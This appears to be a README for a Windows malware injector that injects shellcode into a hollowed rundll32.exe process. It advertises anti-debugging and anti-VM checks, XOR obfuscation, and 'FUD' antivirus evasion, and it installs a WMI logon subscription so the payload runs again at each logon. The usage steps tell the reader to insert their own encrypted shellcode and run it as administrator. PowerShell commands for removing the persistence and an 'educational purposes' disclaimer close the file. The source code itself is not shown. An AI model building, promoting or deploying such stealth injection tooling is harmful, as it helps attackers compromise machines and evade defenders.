# WMI Process Hollowing Injection

Advanced stealth injection tool with anti-debugging, anti-VM, and WMI persistence.

## Features

- **Anti-Debugging**: Detects debuggers, hardware breakpoints, and virtual machines
- **Process Hollowing**: Injects shellcode into suspended `rundll32.exe` process
- **WMI Persistence**: Creates stealth event filter that triggers on user logon
- **XOR Obfuscation**: Encrypts shellcode with random key to avoid signature detection
- **FUD Bypasses**: Uses legitimate system processes and WMI interfaces to avoid detection

## Compilation

```bash
cl /EHsc /O2 wmi_hollow_inject.cpp
```

## Usage

1. Replace the demo `obf_shellcode` with your own XOR-encrypted shellcode
2. Update `obf_key` to match your encryption key
3. Compile and run with administrative privileges

## Persistence

The tool creates a WMI event subscription that triggers on user logon, executing the payload automatically. To remove persistence:

```powershell
Get-WmiObject -Namespace root/subscription -Class __EventFilter | Where-Object Name -eq "Win32_PerfMon" | Remove-WmiObject
Get-WmiObject -Namespace root/subscription -Class ActiveScriptEventConsumer | Where-Object Name -eq "ScriptConsumer" | Remove-WmiObject
Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | Where-Object Filter -like "*Win32_PerfMon*" | Remove-WmiObject
```

## Disclaimer

This tool is for educational purposes only. Use at your own risk. The author is not responsible for any misuse or damage caused by this software.